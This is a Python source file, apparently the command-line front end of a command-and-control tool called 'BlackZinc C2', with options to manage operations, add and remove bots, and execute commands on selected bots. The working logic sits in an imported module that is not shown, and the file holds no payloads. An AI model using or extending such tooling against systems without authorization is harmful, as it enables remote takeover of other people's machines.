import argparse
import json
from logging import exception
import traceback
from zipfile import ZIP_BZIP2

import constants as LC
import variables as LV

from utils import *


def main(options):
    # Init.
    init()

    # Load all operation from JSON file.
    load_operations()

    # List running operations.
    if options["list_operations"]:
        list_operations()

    # Add new operation to the database.
    if options["add_operation"]:
        add_operation()

    # Remove an operation from the database.
    if options["remove_operations"] != "":
        remove_operations(options["remove_operations"])

    # Get details about an operation (example: bots).
    if options["operation_details"] > 0:
        operation_details(options["operation_details"])

    # Add a bot to an operation.
    if options["add_bot"] > 0:
        add_bot(options["add_bot"])

    # Remove a bot from an operation.
    if options["operation"] > 0 and options["remove_bots"] != "":
        remove_bots(options["operation"], options["remove_bots"])

    # Execute command on bots from an operation.
    if options["operation"] > 0 and options["bots"] != "" and options["command"] != "":
        execute(options["operation"], options["bots"], options["command"])

    # Save all operation to JSON file.
    save_operations()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BlackZinc C2 client.")

    parser.add_argument("--list-operations", help="List operation stored in the database.", action='store_true')
    parser.add_argument("--add-operation", help="Add new operation to the database.", action='store_true')
    parser.add_argument("--remove-operations", help="Remove an operation from the database.", default="", type=str)
    parser.add_argument("--operation-details", help="Get details about a specific operation.", default=0, type=int)
    
    parser.add_argument("--add-bot", help="Add a bot to an operation.", default=0, type=int)

    parser.add_argument("--operation", help="Specify operation on which to apply actions.", default=0, type=int)
    parser.add_argument("--remove-bots", help="Remove a bot from an operation.", default="", type=str)
    parser.add_argument("--bots", help="Specify bots on which to apply actions.", default="", type=str)
    parser.add_argument("--command", help="Command to execute on bots.", default="", type=str)


    args = parser.parse_args()
    options = {}
    
    options["list_operations"] = args.list_operations
    options["add_operation"] = args.add_operation
    options["remove_operations"] = args.remove_operations
    options["operation_details"] = args.operation_details
    
    options["add_bot"] = args.add_bot

    options["operation"] = args.operation
    options["remove_bots"] = args.remove_bots
    options["bots"] = args.bots
    options["command"] = args.command


    if options:
        main(options)